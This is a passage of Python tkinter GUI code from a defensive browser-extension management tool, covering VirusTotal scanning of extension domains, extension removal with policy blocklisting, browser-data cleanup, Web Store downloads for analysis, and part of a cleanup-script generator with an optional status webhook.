            self._fit_to_screen(win, 900, 600)
            win.resizable(True, True)

            # API key input
            key_frame = ttk.LabelFrame(win, text="  Configuration  ", padding=10, style="Section.TLabelframe")
            key_frame.pack(fill="x", padx=10, pady=5)
            ttk.Label(key_frame, text="VT API Key:").pack(side="left")
            key_var = tk.StringVar()
            ttk.Entry(key_frame, textvariable=key_var, width=55, show="*").pack(side="left", padx=5)

            # Progress section
            prog_frame = ttk.LabelFrame(win, text="  Scan Status  ", padding=10, style="Section.TLabelframe")
            prog_frame.pack(fill="x", padx=10, pady=5)
            prog_label = ttk.Label(prog_frame, text="Ready. Select extensions and click Start Scan.")
            prog_label.pack(anchor="w")
            prog_bar = ttk.Progressbar(prog_frame, mode="determinate", length=400)
            prog_bar.pack(fill="x", pady=5)
            rate_label = ttk.Label(prog_frame, text="", foreground="#666")
            rate_label.pack(anchor="w")

            # Results table
            res_frame = ttk.LabelFrame(win, text="  Scan Results  ", padding=10, style="Section.TLabelframe")
            res_frame.pack(fill="both", expand=True, padx=10, pady=5)

            res_tree = ttk.Treeview(res_frame, columns=("ext", "domain", "status", "mal", "sus", "link"),
                                     show="headings", height=15)
            res_tree.heading("ext", text="Extension")
            res_tree.heading("domain", text="Domain / IP")
            res_tree.heading("status", text="Status")
            res_tree.heading("mal", text="Malicious")
            res_tree.heading("sus", text="Suspicious")
            res_tree.heading("link", text="VT Link (dbl-click)")
            res_tree.column("ext", width=140)
            res_tree.column("domain", width=160)
            res_tree.column("status", width=65, anchor="center")
            res_tree.column("mal", width=65, anchor="center")
            res_tree.column("sus", width=65, anchor="center")
            res_tree.column("link", width=280)
            if getattr(self, "is_dark_mode", False):
                res_tree.tag_configure("flagged", background="#4a1515", foreground="#ffffff")
                res_tree.tag_configure("clean", background="#1a3d24", foreground="#ffffff")
                res_tree.tag_configure("error", background="#4d3800", foreground="#ffffff")
            else:
                res_tree.tag_configure("flagged", background="#fce4ec", foreground="#000000")
                res_tree.tag_configure("clean", background="#e8f5e9", foreground="#000000")
                res_tree.tag_configure("error", background="#fff3e0", foreground="#000000")

            res_scroll = ttk.Scrollbar(res_frame, orient="vertical", command=res_tree.yview)
            res_tree.configure(yscrollcommand=res_scroll.set)
            res_tree.pack(side="left", fill="both", expand=True)
            res_scroll.pack(side="right", fill="y")

            def on_dblclick(event):
                import webbrowser
                item = res_tree.identify_row(event.y)
                if item:
                    vals = res_tree.item(item, "values")
                    link = vals[5] if len(vals) > 5 else ""
                    if link and link.startswith("http"):
                        webbrowser.open(link)
            res_tree.bind("<Double-1>", on_dblclick)

            def run_batch_scan():
                import threading
                key = key_var.get().strip()
                if not key:
                    messagebox.showwarning("Missing Key", "Enter your VirusTotal API key.")
                    return

                def do_scan():
                    # Count total domains across all extensions
                    total_domains = sum(min(30, len(ext.extracted_domains)) for ext in batch_exts)
                    prog_bar["maximum"] = max(1, total_domains)
                    prog_bar["value"] = 0
                    scanned = 0
                    detected_rate = None

                    for ext in batch_exts:
                        prog_label.config(text=f"Scanning: {ext.name} ({len(ext.extracted_domains)} domains)...")
                        win.update_idletasks()

                        results = self.manager.scan_with_virustotal(ext, key, rate_limit=detected_rate)
                        if detected_rate is None:
                            detected_rate = results.get("rate_used", 4)
                            tier = "Premium" if detected_rate > 4 else "Free"
                            rate_label.config(text=f"API tier: {tier} ({detected_rate:.0f} req/min)")

                        for d in results.get("domain_results", []):
                            vt = d.get("vt_result", {})
                            if not isinstance(vt, dict):
                                continue
                            if "error" in vt:
                                tag = "error"
                                status = "ERROR"
                                mal = "-"
                                sus = "-"
                                link = str(vt.get("error", ""))[:50]
                            elif vt.get("malicious", 0) > 0 or vt.get("suspicious", 0) > 0:
                                tag = "flagged"
                                status = "\u26a0 FLAG"
                                mal = str(vt.get("malicious", 0))
                                sus = str(vt.get("suspicious", 0))
                                link = vt.get("link", "")
                            else:
                                tag = "clean"
                                status = "\u2713 Clean"
                                mal = "0"
                                sus = "0"
                                link = vt.get("link", "")

                            res_tree.insert("", "end", values=(
                                ext.name[:25], d["domain"], status, mal, sus, link
                            ), tags=(tag,))
                            scanned += 1
                            prog_bar["value"] = scanned
                            win.update_idletasks()

                    prog_bar["value"] = prog_bar["maximum"]
                    prog_label.config(text=f"Done! Scanned {scanned} domains across {len(batch_exts)} extensions.")
                    win.update_idletasks()

                threading.Thread(target=do_scan, daemon=True).start()

            ttk.Button(key_frame, text="Scan Network IOCs", command=run_batch_scan).pack(side="left", padx=5)

        def remove_selected(self):
            selected = self.tree.selection()
            if not selected:
                messagebox.showwarning("No Selection", "Please select extensions to remove")
                return
            
            # Get extension IDs from tree values (column index 1); preserve order, dedupe IDs
            ext_ids = list(dict.fromkeys(
                self.tree.item(uid, "values")[1] for uid in selected
            ))
            
            # Check for running browsers
            browsers = set()
            for ext_id in ext_ids:
                exts = self.manager.find_extension_by_id(ext_id)
                for ext in exts:
                    browsers.add(ext.browser)
            
            running = [b for b in browsers if self.manager.check_browser_running(b)]
            if running:
                close = messagebox.askyesno("Browsers Running",
                    f"These browsers need to be closed:\n{', '.join(running)}\n\n"
                    f"Close them automatically?")
                if not close:
                    return
                failed = [b for b in running if not self.manager.close_browser(b)]
                if failed:
                    messagebox.showerror("Error", f"Could not close: {', '.join(failed)}")
                    return
            
            row_count = len(selected)
            id_count = len(ext_ids)
            summary_lines = []
            for uid in selected:
                v = self.tree.item(uid, "values")
                if len(v) >= 5:
                    name_disp, eid, _ver, br, prof = v[0], v[1], v[2], v[3], v[4]
                    summary_lines.append(f"• {name_disp} — {br}/{prof}\n  ID {eid}")
            summary_txt = "\n".join(summary_lines) if summary_lines else ""
            
            confirm_dlg = self._make_toplevel()
            confirm_dlg.title("Confirm Removal")
            self._fit_to_screen(confirm_dlg, 560, 340, min_w=520, min_h=300)
            confirm_dlg.grab_set()
            confirm_dlg.resizable(True, True)
            
            wrap = 500
            ttk.Label(
                confirm_dlg,
                text=f"Remove {row_count} selected row(s) ({id_count} unique extension ID(s))? This cannot be undone.",
                font=("Segoe UI", 10),
                wraplength=wrap,
                justify="left",
            ).pack(pady=(15, 8), padx=20, anchor="w")
            if summary_txt:
                ttk.Label(
                    confirm_dlg,
                    text=summary_txt,
                    font=("Segoe UI", 9),
                    wraplength=wrap,
                    justify="left",
                ).pack(pady=(0, 8), padx=20, anchor="w")
            want_bl = bool(getattr(self, "blocklist_var", None) and self.blocklist_var.get())
            if want_bl and platform.system() == "Windows":
                ttk.Label(
                    confirm_dlg,
                    text=(
                        "Policy blocking is on: Windows may show one Administrator (UAC) prompt to save the block. "
                        "After removal, fully quit and restart each affected browser so the block applies."
                    ),
                    font=("Segoe UI", 9),
                    foreground="#0066aa",
                    justify="left",
                    wraplength=wrap,
                ).pack(anchor="w", padx=20, pady=(0, 6))
            
            remove_clean_prefs_var = tk.BooleanVar(value=False)
            prefs_frame = ttk.Frame(confirm_dlg)
            prefs_frame.pack(fill="x", padx=20)
            ttk.Checkbutton(prefs_frame, text="Also clean from Preferences files",
                          variable=remove_clean_prefs_var).pack(anchor="w")
            ttk.Label(
                prefs_frame,
                text="Removes phantom entries. May trigger a one-time Chrome recovery prompt.",
                foreground="#cc6600",
                font=("Segoe UI", 8),
                wraplength=wrap,
                justify="left",
            ).pack(anchor="w", padx=(20, 0))
            
            confirmed = [False]
            
            def do_remove():
                confirmed[0] = True
                confirm_dlg.destroy()
            
            btn_frame = ttk.Frame(confirm_dlg)
            btn_frame.pack(pady=15)
            ttk.Button(btn_frame, text="Remove", command=do_remove).pack(side="left", padx=5)
            ttk.Button(btn_frame, text="Cancel", command=confirm_dlg.destroy).pack(side="left", padx=5)
            
            confirm_dlg.wait_window()
            if not confirmed[0]:
                return
            
            do_prefs_clean = remove_clean_prefs_var.get()
            want_blocklist = bool(getattr(self, 'blocklist_var', None) and self.blocklist_var.get())
            
            try:
                installs_removed = 0
                blocklist_added = 0
                blocklist_already = 0
                blocklist_failed = 0
                blocklist_fail_detail = ""
                results = self.manager.remove_extensions_by_ids(
                    ext_ids,
                    clean_preferences=do_prefs_clean,
                    apply_blocklist=want_blocklist,
                )
                for r in results:
                    if r.action == "remove_extension" and r.success and r.items_removed > 0:
                        installs_removed += 1
                    if r.action == "policy_blocklist":
                        if r.success:
                            if r.items_removed > 0:
                                blocklist_added += 1
                            else:
                                blocklist_already += 1
                        else:
                            blocklist_failed += 1
                            if not blocklist_fail_detail and r.details:
                                blocklist_fail_detail = r.details
                
                msg = f"Removed {installs_removed} installation(s) (files deleted)"
                if do_prefs_clean:
                    msg += "\nPreference entries cleaned where applicable"
                if want_blocklist:
                    if blocklist_added or blocklist_already:
                        msg += f"\nPolicy blocklist: {blocklist_added} new entr{'y' if blocklist_added == 1 else 'ies'}"
                        if blocklist_already:
                            msg += f", {blocklist_already} already listed"
                    elif blocklist_failed:
                        msg += "\nPolicy blocklist: could not write or verify registry."
                        if blocklist_fail_detail:
                            msg += f"\n\n{blocklist_fail_detail}"
                    else:
                        msg += "\nPolicy blocklist: no entries recorded for this removal."
                if want_blocklist and self.manager.system == "Windows":
                    show_reg = blocklist_failed or not (blocklist_added or blocklist_already)
                    if show_reg:
                        msg += "\n\n--- Policy registry (read-only) ---\n"
                        bl_browsers = sorted(
                            {b.lower() for b in browsers if str(b).lower() in ("chrome", "edge", "brave")}
                        )
                        if not bl_browsers:
                            bl_browsers = ["chrome", "edge", "brave"]
                        for bb in bl_browsers:
                            msg += self.manager.policy_blocklist_registry_status_windows(bb) + "\n"
                messagebox.showinfo("Complete", msg)
            except Exception as ex:
                import traceback
                self.manager.log(traceback.format_exc())
                messagebox.showerror("Removal failed", str(ex))
            finally:
                try:
                    self.scan_extensions(offer_metadata_prompt=False)
                except Exception:
                    pass
        
        def show_cleanup_dialog(self):
            dialog = self._make_toplevel()
            dialog.title("Clean Browser Data")
            self._fit_to_screen(dialog, 450, 480)
            dialog.grab_set()
            
            ttk.Label(dialog, text="Select data to clean:",
                     font=("Segoe UI", 12, "bold")).pack(pady=10)
            
            # Browser selection
            browser_frame = ttk.LabelFrame(dialog, text="  Browsers  ", padding="10", style="Section.TLabelframe")
            browser_frame.pack(fill="x", padx=10, pady=5)
            
            browser_vars = {}
            for browser in ["chrome", "edge", "brave"]:
                var = tk.BooleanVar(value=True)
                browser_vars[browser] = var
                ttk.Checkbutton(browser_frame, text=browser.capitalize(),
                              variable=var).pack(side="left", padx=15)
            
            # Cleanup options
            options_frame = ttk.LabelFrame(dialog, text="  Data to Clean  ", padding="10", style="Section.TLabelframe")
            options_frame.pack(fill="x", padx=10, pady=5)
            
            storage_var = tk.BooleanVar(value=True)
            sw_var = tk.BooleanVar(value=True)
            cache_var = tk.BooleanVar(value=True)
            cookies_var = tk.BooleanVar(value=False)
            
            ttk.Checkbutton(options_frame, text="LocalStorage",
                          variable=storage_var).pack(anchor="w", pady=2)
            ttk.Checkbutton(options_frame, text="Service Workers",
                          variable=sw_var).pack(anchor="w", pady=2)
            ttk.Checkbutton(options_frame, text="Cache",
                          variable=cache_var).pack(anchor="w", pady=2)
            ttk.Checkbutton(options_frame, text="Cookies (will log you out of all sites)",
                          variable=cookies_var).pack(anchor="w", pady=2)
            
            # Sync options
            sync_frame = ttk.LabelFrame(dialog, text="  Google Account Sync  ", padding="10", style="Section.TLabelframe")
            sync_frame.pack(fill="x", padx=10, pady=5)
            
            disable_sync_var = tk.BooleanVar(value=False)
            ttk.Checkbutton(sync_frame, text="Disable extension sync (prevents re-install of removed extensions)",
                          variable=disable_sync_var).pack(anchor="w")
            ttk.Label(sync_frame, text="Disables sync for extensions/apps so removed extensions\n"
                     "won't be re-downloaded from your Google account.",
                     foreground="#666", font=("Segoe UI", 8)).pack(anchor="w", pady=(3, 0))
            
            ttk.Button(dialog, text="Clean", command=lambda: do_cleanup()).pack(pady=10)

            ttk.Label(dialog, text="Running browsers will be closed automatically before cleaning.",
                     foreground="#666").pack(pady=10)
            
            def do_cleanup():
                browsers = [b for b, v in browser_vars.items() if v.get()]
                running = [b for b in browsers if self.manager.check_browser_running(b)]
                
                if running:
                    close = messagebox.askyesno("Browsers Running",
                        f"These browsers need to be closed:\n{', '.join(running)}\n\n"
                        f"Close them automatically?")
                    if not close:
                        return
                    failed = [b for b in running if not self.manager.close_browser(b)]
                    if failed:
                        messagebox.showerror("Error", f"Could not close: {', '.join(failed)}")
                        return
                
                results = self.manager.clean_all_browsers(
                    browsers=browsers,
                    clean_storage=storage_var.get(),
                    clean_sw=sw_var.get(),
                    clean_cache=cache_var.get(),
                    clean_cookies=cookies_var.get()
                )
                
                # Disable sync if requested
                if disable_sync_var.get():
                    for browser in browsers:
                        sync_results = self.manager.disable_all_extension_sync(browser)
                        results.extend(sync_results)
                
                success = sum(1 for r in results if r.success)
                dialog.destroy()
                
                msg = f"Cleanup complete!\n{success} operations succeeded"
                if disable_sync_var.get():
                    msg += "\n\nExtension sync has been disabled.\nRe-enable it manually in browser settings when ready."
                messagebox.showinfo("Complete", msg)
            
        def show_blocklist_manager(self):
            if self.manager.system != "Windows":
                messagebox.showinfo("Not Supported", "Registry Blocklist management is only supported on Windows.")
                return
                
            dialog = self._make_toplevel()
            dialog.title("Manage Extension Blocklist")
            self._fit_to_screen(dialog, 700, 400, min_w=700, min_h=400)
            
            # Header
            header = ttk.Frame(dialog, padding="10")
            header.pack(fill="x")
            ttk.Label(header, text="🛡️ Extension Blocklist Manager", font=("Segoe UI", 14, "bold")).pack(anchor="w")
            ttk.Label(header, text="View and manage extensions blocked via Windows Registry policies", foreground="#666").pack(anchor="w")
            
            # Listbox
            list_frame = ttk.LabelFrame(dialog, text="  Active Policies  ", padding="10", style="Section.TLabelframe")
            list_frame.pack(fill="both", expand=True, padx=10, pady=5)
            
            tree = ttk.Treeview(
                list_frame, columns=("browser", "name", "id"), show="headings", selectmode="extended"
            )
            tree.heading("browser", text="Browser")
            tree.heading("name", text="Extension name")
            tree.heading("id", text="Extension ID")
            tree.column("browser", width=90)
            tree.column("name", width=240)
            tree.column("id", width=300)
            
            vsb = ttk.Scrollbar(list_frame, orient="vertical", command=tree.yview)
            tree.configure(yscrollcommand=vsb.set)
            
            tree.pack(side="left", fill="both", expand=True)
            vsb.pack(side="right", fill="y")
            
            def refresh_blocklist():
                for item in tree.get_children():
                    tree.delete(item)
                dialog.update_idletasks()
                blocklist = self.manager.get_blocklist()
                count = 0
                for browser, ext_ids in blocklist.items():
                    for ext_id in ext_ids:
                        nm = self.manager.blocklist_display_name(browser, ext_id) or "(unknown)"
                        tree.insert("", "end", values=(browser.capitalize(), nm, ext_id))
                        count += 1
                if count == 0:
                    tree.insert("", "end", values=("-", "-", "No extensions are currently blocklisted."))
                tree.update_idletasks()
            
            def unblock_selected():
                selected = tree.selection()
                if not selected:
                    messagebox.showwarning("No Selection", "Please select an extension to unblock.")
                    return
                for item in selected:
                    values = tree.item(item, 'values')
                    if values[2] != "No extensions are currently blocklisted.":
                        self.manager.unblock_extension(values[2])
                refresh_blocklist()
                dialog.update()
                messagebox.showinfo(
                    "Unblock",
                    "Done. If a row remains, approve the Administrator (UAC) prompt (needed for HKLM), then press Refresh.",
                )
                
            def clear_all():
                if messagebox.askyesno("Confirm Clear", "Are you sure you want to clear ALL browser extension blocklists?"):
                    self.manager.clear_blocklist()
                    refresh_blocklist()
                    dialog.update()
                    messagebox.showinfo(
                        "Clear blocklist",
                        "Done. Approve UAC if shown (clears machine-wide HKLM policies), then press Refresh if needed.",
                    )
            
            def get_blocklist_text():
                """Build a text representation of the current blocklist."""
                blocklist = self.manager.get_blocklist()
                lines = []
                for browser, ext_ids in blocklist.items():
                    for ext_id in ext_ids:
                        nm = self.manager.blocklist_display_name(browser, ext_id) or ""
                        safe = nm.replace(",", ";") if nm else "(unknown)"
                        lines.append(f"{browser.capitalize()},{safe},{ext_id}")
                return lines

            def export_blocklist():
                lines = get_blocklist_text()
                if not lines:
                    messagebox.showinfo("Empty", "No extensions are currently blocklisted.")
                    return
                from tkinter import filedialog
                path = filedialog.asksaveasfilename(
                    parent=dialog,
                    title="Export Blocklist",
                    defaultextension=".csv",
                    filetypes=[("CSV files", "*.csv"), ("Text files", "*.txt"), ("All files", "*.*")]
                )
                if not path:
                    return
                with open(path, 'w', encoding='utf-8') as f:
                    f.write("Browser,Extension name,Extension ID\n")
                    f.write("\n".join(lines) + "\n")
                messagebox.showinfo("Exported", f"Blocklist exported to:\n{path}")

            def copy_blocklist():
                lines = get_blocklist_text()
                if not lines:
                    messagebox.showinfo("Empty", "No extensions are currently blocklisted.")
                    return
                text = "Browser,Extension name,Extension ID\n" + "\n".join(lines)
                dialog.clipboard_clear()
                dialog.clipboard_append(text)
                messagebox.showinfo("Copied", f"Blocklist ({len(lines)} entries) copied to clipboard.")

            btn_frame = ttk.Frame(dialog, padding="10")
            btn_frame.pack(fill="x")
            ttk.Button(btn_frame, text="Refresh", command=refresh_blocklist).pack(side="left", padx=5)
            ttk.Button(btn_frame, text="Unblock Selected", command=unblock_selected).pack(side="left", padx=5)
            ttk.Button(btn_frame, text="Clear ALL Blocklists", command=clear_all).pack(side="left", padx=5)
            ttk.Button(btn_frame, text="Export Blocklist", command=export_blocklist).pack(side="left", padx=5)
            ttk.Button(btn_frame, text="Copy to Clipboard", command=copy_blocklist).pack(side="left", padx=5)
            ttk.Button(btn_frame, text="Close", command=dialog.destroy).pack(side="right", padx=5)
            
            refresh_blocklist()

        def show_download_dialog(self):
            """Show dialog to download extension from Chrome Web Store"""
            if not REQUESTS_AVAILABLE:
                messagebox.showerror("Missing Dependency",
                    "requests library required for downloading.\n\n"
                    "Install with: pip install requests")
                return
            
            dialog = self._make_toplevel()
            dialog.title("Download Extension from Chrome Web Store")
            self._fit_to_screen(dialog, 600, 450, min_w=600, min_h=450)
            dialog.grab_set()
            
            # Header
            header = ttk.Frame(dialog, padding="10")
            header.pack(fill="x")
            ttk.Label(header, text="📥 Download Extension from Chrome Web Store",
                     font=("Segoe UI", 14, "bold")).pack(anchor="w")
            ttk.Label(header, text="Download and extract Chrome extensions for offline analysis and inspection.",
                     foreground="#666").pack(anchor="w")
            
            # Extension ID input
            input_frame = ttk.LabelFrame(dialog, text="  Extension ID or URL  ", padding="10", style="Section.TLabelframe")
            input_frame.pack(fill="x", padx=10, pady=5)
            
            ttk.Label(input_frame, text="Enter extension ID (32 characters) or full Chrome Web Store URL:").pack(anchor="w")
            ttk.Label(input_frame, text="Example: nkbihfbeogaeaoehlefnkodbefgpgknn or https://chrome.google.com/webstore/detail/...",
                     foreground="#888", font=("Segoe UI", 8)).pack(anchor="w")
            
            ext_input = ttk.Entry(input_frame, width=60, font=("Consolas", 10))
            ext_input.pack(fill="x", pady=(5, 0))
            
            # Options
            options_frame = ttk.LabelFrame(dialog, text="  Download Options  ", padding="10", style="Section.TLabelframe")
            options_frame.pack(fill="x", padx=10, pady=5)
            
            extract_var = tk.BooleanVar(value=True)
            ttk.Checkbutton(options_frame, text="Extract ZIP after download (recommended for analysis)",
                          variable=extract_var).pack(anchor="w")
            
            # Output directory
            ttk.Label(options_frame, text="Save to directory:").pack(anchor="w", pady=(10, 0))
            
            dir_frame = ttk.Frame(options_frame)
            dir_frame.pack(fill="x", pady=(3, 0))
            
            dir_var = tk.StringVar(value="./downloaded_extensions")
            dir_entry = ttk.Entry(dir_frame, textvariable=dir_var, width=50)
            dir_entry.pack(side="left", fill="x", expand=True)
            
            def browse_dir():
                from tkinter import filedialog
                path = filedialog.askdirectory()
                if path:
                    dir_var.set(path)
            
            ttk.Button(dir_frame, text="Browse...", command=browse_dir).pack(side="left", padx=(5, 0))
            
            # Status area
            status_frame = ttk.Frame(dialog, padding="10")
            status_frame.pack(fill="x")
            
            status_var = tk.StringVar(value="Ready to download")
            status_label = ttk.Label(status_frame, textvariable=status_var, foreground="#666")
            status_label.pack()
            
            def do_download():
                input_text = ext_input.get().strip()
                if not input_text:
                    messagebox.showwarning("Input Required", "Please enter an extension ID or URL")
                    return
                
                # Extract ID from URL if needed
                if 'chrome.google.com' in input_text:
                    try:
                        ext_id = ChromeWebStoreURLBuilder.parse_webstore_url(input_text)
                        status_var.set(f"Extracted ID: {ext_id}")
                    except Exception as e:
                        messagebox.showerror("Invalid URL", str(e))
                        return
                else:
                    ext_id = input_text
                
                # Validate ID
                if not re.match(r'^[a-p]{32}$', ext_id):
                    messagebox.showerror("Invalid ID",
                        "Extension ID must be exactly 32 characters (a-p only)")
                    return
                
                status_var.set("⏳ Downloading... please wait")
                status_label.configure(foreground="#0066cc")
                dialog.update()
                
                try:
                    downloader = ExtensionDownloader(output_dir=dir_var.get(), verbose=False)
                    result = downloader.download(ext_id, extract=extract_var.get(), show_progress=False)
                    
                    info_msg = f"Downloaded successfully!\n\n"
                    info_msg += f"ZIP file: {result['zip_file']}\n"
                    info_msg += f"Size: {ExtensionDownloader._format_size(result['size'])}\n"
                    
                    if result.get('extracted_dir'):
                        info_msg += f"Extracted to: {result['extracted_dir']}\n"
                    
                    if result.get('manifest'):
                        m = result['manifest']
                        info_msg += f"\nName: {m.get('name', 'Unknown')}\n"
                        info_msg += f"Version: {m.get('version', 'Unknown')}"
                    
                    dialog.destroy()
                    messagebox.showinfo("Download Complete", info_msg)
                    
                except Exception as e:
                    status_var.set(f"❌ Error: {e}")
                    status_label.configure(foreground="#cc0000")
            
            # Buttons
            btn_frame = ttk.Frame(dialog, padding="10")
            btn_frame.pack(fill="x")
            download_btn = ttk.Button(btn_frame, text="⬇️ Start Download", command=do_download, width=20)
            download_btn.pack(side="left", padx=(0, 10))
            ttk.Button(btn_frame, text="Cancel", command=dialog.destroy, width=12).pack(side="left")
        
        def copy_selected(self):
            """Copy selected installed extension for analysis"""
            selected = self.tree.selection()
            if not selected:
                messagebox.showwarning("No Selection", "Please select an extension to copy")
                return
            
            from tkinter import filedialog
            output_dir = filedialog.askdirectory(title="Select output directory")
            if not output_dir:
                return
            
            # Get extension IDs from tree values (column index 1)
            ext_ids = [self.tree.item(uid, "values")[1] for uid in selected]
            
            copied = 0
            for ext_id in ext_ids:
                exts = self.manager.find_extension_by_id(ext_id)
                for ext in exts:
                    try:
                        result = self.manager.download_installed_extension(ext, output_dir)
                        copied += 1
                    except Exception as e:
                        messagebox.showerror("Error", f"Failed to copy {ext.name}: {e}")
            
            if copied > 0:
                messagebox.showinfo("Complete", f"Copied {copied} extension(s) to:\n{output_dir}")
        
        def show_script_dialog(self):
            dialog = self._make_toplevel()
            dialog.title("Cleanup Script Generator")
            self._fit_to_screen(dialog, 1050, 550, min_w=1050, min_h=550)
            
            # Header
            header = ttk.Frame(dialog, padding="10")
            header.pack(fill="x")
            ttk.Label(header, text="📋 Cleanup Script Generator",
                     font=("Segoe UI", 14, "bold")).pack(anchor="w")
            ttk.Label(header, text="Generate scripts for local or REMOTE cleanup of ALL browser data",
                     foreground="#666").pack(anchor="w")
            
            # Create a main container for side-by-side config
            config_pane = ttk.Frame(dialog)
            config_pane.pack(fill="x", padx=5, pady=0)
            
            left_col = ttk.Frame(config_pane)
            left_col.pack(side="left", fill="both", expand=True, padx=5)
            
            right_col = ttk.Frame(config_pane)
            right_col.pack(side="left", fill="both", expand=True, padx=5)
            
            # Script type selection
            type_frame = ttk.LabelFrame(left_col, text="  Script Type  ", padding="10", style="Section.TLabelframe")
            type_frame.pack(fill="x", pady=(0, 5))
            
            script_type_var = tk.StringVar(value="remote_python")
            
            ttk.Radiobutton(type_frame, text="Python (Remote - Cross-platform, clears ALL sites)", 
                          variable=script_type_var, value="remote_python").pack(anchor="w")
            ttk.Radiobutton(type_frame, text="PowerShell (Remote - Windows, clears ALL sites)", 
                          variable=script_type_var, value="remote_powershell").pack(anchor="w")
            ttk.Radiobutton(type_frame, text="Bash (Remote - Linux/Mac, clears ALL sites)", 
                          variable=script_type_var, value="remote_bash").pack(anchor="w")
            ttk.Radiobutton(type_frame, text="JavaScript (Local - Browser console, current site only)", 
                          variable=script_type_var, value="browser_js").pack(anchor="w")
            
            # Target Browsers
            browser_frame = ttk.LabelFrame(left_col, text="  Target Browsers  ", padding="10", style="Section.TLabelframe")
            browser_frame.pack(fill="x", pady=5)
            
            target_browsers_vars = {
                "Chrome": tk.BooleanVar(value=True),
                "Edge": tk.BooleanVar(value=True),
                "Brave": tk.BooleanVar(value=True),
            }
            
            b_frame = ttk.Frame(browser_frame)
            b_frame.pack(fill="x")
            for b_name, var in target_browsers_vars.items():
                ttk.Checkbutton(b_frame, text=b_name, variable=var).pack(side="left", padx=(0, 15))
            
            # Extension removal option (optional)
            ext_frame = ttk.LabelFrame(left_col, text="  Extension Removal (Optional)  ", padding="10", style="Section.TLabelframe")
            ext_frame.pack(fill="x", pady=5)
            
            ext_top = ttk.Frame(ext_frame)
            ext_top.pack(fill="x")
            ttk.Label(ext_top, text="Extension IDs to remove (one per line):").pack(side="left")
            apply_btn = ttk.Button(ext_top, text="Apply & Regenerate")
            apply_btn.pack(side="right")
            
            ext_id_text = tk.Text(ext_frame, height=2, width=60, font=("Consolas", 10))
            ext_id_text.pack(fill="x", pady=(5, 0))
            ttk.Label(ext_frame, text="Removes extensions, cleans preferences, disables sync, and applies blocklist automatically.",
                     foreground="#666", font=("Segoe UI", 8)).pack(anchor="w", pady=(3, 0))
            
            blocklist_script_var = tk.BooleanVar(value=True)
            blocklist_row = ttk.Frame(ext_frame)
            blocklist_row.pack(fill="x", pady=(5, 0))
            ttk.Checkbutton(blocklist_row, text="Add to policy blocklist (prevents reinstallation)",
                          variable=blocklist_script_var).pack(side="left")
            blocklist_script_help = ttk.Label(blocklist_row, text="(?)", foreground="#0066cc", cursor="hand2")
            blocklist_script_help.pack(side="left", padx=(5, 0))
            blocklist_script_help.bind("<Button-1>", lambda e: messagebox.showinfo("Blocklist Help",
                "When checked, the generated script will add removed extension IDs to the OS-level "
                "ExtensionInstallBlocklist enterprise policy.\n\n"
                "This prevents the extensions from being reinstalled via sync or the Chrome Web Store.\n\n"
                "Windows: Writes to Registry (HKLM/HKCU).\n"
                "macOS: Writes to managed preferences (defaults write).\n"
                "Linux: Creates JSON policy files in /etc/opt/{browser}/policies/managed/.\n\n"
                "Enabled by default. Uncheck only if you want a temporary removal without blocking."))
            ttk.Label(ext_frame, text="Uncheck for temporary removal without policy blocking. Sync disable and preferences cleanup always run.",
                     foreground="#666", font=("Segoe UI", 8)).pack(anchor="w", pady=(2, 0))
            
            # Webhook URL input
            webhook_frame = ttk.LabelFrame(right_col, text="  Webhook Notification (optional)  ", padding="10", style="Section.TLabelframe")
            webhook_frame.pack(fill="x", pady=(0, 5))
            
            webhook_row = ttk.Frame(webhook_frame)
            webhook_row.pack(fill="x")
            ttk.Label(webhook_row, text="URL:").pack(side="left")
            webhook_url_var = tk.StringVar(value="")
            webhook_entry = ttk.Entry(webhook_row, textvariable=webhook_url_var, width=50, font=("Consolas", 9))
            webhook_entry.pack(side="left", fill="x", expand=True, padx=(5, 0))
            webhook_help = ttk.Label(webhook_row, text="(?)", foreground="#0066cc", cursor="hand2")
            webhook_help.pack(side="left", padx=(5, 0))
            webhook_help.bind("<Button-1>", lambda e: messagebox.showinfo("Webhook Help",
                "If a URL is provided, the generated script will send HTTP POST requests:\n\n"
                "1. At the START of execution - with host, user, OS, and timestamp\n\n"
                "2. At the END of execution - with detailed results including:\n"
                "   - Status (success/failed)\n"
                "   - Browsers found and closed\n"
                "   - Extensions removed (which ones, from where)\n"
                "   - Data cleaned (which browsers, which users)\n"
                "   - Errors encountered\n"
                "   - Log file content\n\n"
                "Leave blank to disable webhook notifications.\n"
                "Example: https://webhook.site/your-unique-id"))
            ttk.Label(webhook_frame, text="Send execution start/end status with detailed cleanup results to this URL.",
                     foreground="#666", font=("Segoe UI", 8)).pack(anchor="w", pady=(3, 0))
            
            # Data to clean checkboxes
            data_frame = ttk.LabelFrame(right_col, text="  Data to Clean (uncheck to skip)  ", padding="10", style="Section.TLabelframe")
            data_frame.pack(fill="x", pady=(0, 5))
            
            clean_localstorage_var = tk.BooleanVar(value=True)
            clean_sessionstorage_var = tk.BooleanVar(value=True)
            clean_cache_var = tk.BooleanVar(value=True)
            clean_serviceworkers_var = tk.BooleanVar(value=True)
            clean_indexeddb_var = tk.BooleanVar(value=True)
            clean_cookies_var = tk.BooleanVar(value=False)
            
            data_left = ttk.Frame(data_frame)
            data_left.pack(side="left", fill="both", expand=True)
            data_right = ttk.Frame(data_frame)
            data_right.pack(side="left", fill="both", expand=True)
            
            ttk.Checkbutton(data_left, text="LocalStorage", variable=clean_localstorage_var).pack(anchor="w")
            ttk.Label(data_left, text="Per-site persistent key-value data (login tokens, preferences, tracking data)",
                     foreground="#666", font=("Segoe UI", 7), wraplength=350).pack(anchor="w", padx=(20, 0))
            
            ttk.Checkbutton(data_left, text="SessionStorage", variable=clean_sessionstorage_var).pack(anchor="w", pady=(4, 0))
            ttk.Label(data_left, text="Temporary per-tab data, cleared when the tab closes (form state, temp tokens)",
                     foreground="#666", font=("Segoe UI", 7), wraplength=350).pack(anchor="w", padx=(20, 0))
            
            ttk.Checkbutton(data_left, text="Cache", variable=clean_cache_var).pack(anchor="w", pady=(4, 0))
            ttk.Label(data_left, text="Cached web resources (images, scripts, stylesheets) - speeds up page loads",
                     foreground="#666", font=("Segoe UI", 7), wraplength=350).pack(anchor="w", padx=(20, 0))
            
            ttk.Checkbutton(data_right, text="Service Workers", variable=clean_serviceworkers_var).pack(anchor="w")
            ttk.Label(data_right, text="Background scripts that enable offline mode, push notifications, and request interception",
                     foreground="#666", font=("Segoe UI", 7), wraplength=350).pack(anchor="w", padx=(20, 0))
            
            ttk.Checkbutton(data_right, text="IndexedDB", variable=clean_indexeddb_var).pack(anchor="w", pady=(4, 0))
            ttk.Label(data_right, text="Client-side database used by web apps for large structured data (offline data, blobs)",
